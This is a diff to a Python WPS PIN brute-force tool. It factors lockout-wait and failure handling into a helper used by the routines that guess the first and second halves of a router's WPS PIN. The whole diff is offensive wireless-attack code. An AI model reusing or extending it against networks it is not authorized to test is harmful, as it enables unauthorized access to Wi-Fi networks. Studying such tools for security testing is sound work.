@@ -85,6 +85,29 @@ class Initialize:
             interface, self.settings, self.prompter, self.session
         )
 
+    def _attemptPin(self, bssid: str, pin: str) -> str:
+        """Tries one WPS PIN via self.CONNECTION.singleConnection, and
+        handles the lock-detection/backoff and WPS_FAIL logging shared by
+        _firstHalfBruteforce and _secondHalfBruteforce. Returns 'locked',
+        'wps_fail', or 'ok' (attempt completed without either) for the
+        caller to interpret against its own specific success condition
+        (isFirstHalfValid() / LAST_M_MESSAGE), via the still-live
+        self.CONNECTION.CONNECTION_STATUS.
+        """
+
+        self.CONNECTION.singleConnection(bssid, pin)
+
+        if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
+            logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.settings.timeout}s…')
+            time.sleep(self.settings.timeout)
+            return 'locked'
+
+        if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
+            logger.warning('WPS transaction failed, re-trying last pin')
+            return 'wps_fail'
+
+        return 'ok'
+
     def _firstHalfBruteforce(self, bssid: str, first_half: str) -> str | bool:
         """Attempts to bruteforce the first half of a WPS PIN"""
 
@@ -98,19 +121,16 @@ class Initialize:
             t = int(first_half + '000')
             pin = f'{first_half}000{checksum(t)}'
 
-            self.CONNECTION.singleConnection(bssid, pin)
+            result = self._attemptPin(bssid, pin)
 
-            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
-                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.settings.timeout}s…')
-                time.sleep(self.settings.timeout)
+            if result == 'locked':
                 continue
 
             if self.CONNECTION.CONNECTION_STATUS.isFirstHalfValid():
                 logger.info('First half found')
                 return first_half
 
-            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
-                logger.warning('WPS transaction failed, re-trying last pin')
+            if result == 'wps_fail':
                 return self._firstHalfBruteforce(bssid, first_half)
 
             first_half = str(int(first_half) + 1).zfill(4)
@@ -135,18 +155,15 @@ class Initialize:
             t = int(first_half + second_half)
             pin = f'{first_half}{second_half}{checksum(t)}'
 
-            self.CONNECTION.singleConnection(bssid, pin)
+            result = self._attemptPin(bssid, pin)
 
-            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
-                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.settings.timeout}s…')
-                time.sleep(self.settings.timeout)
+            if result == 'locked':
                 continue
 
             if self.CONNECTION.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                 return pin
 
-            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
-                logger.warning('WPS transaction failed, re-trying last pin')
+            if result == 'wps_fail':
                 return self._secondHalfBruteforce(bssid, first_half, second_half)
 
             second_half = str(int(second_half) + 1).zfill(3)
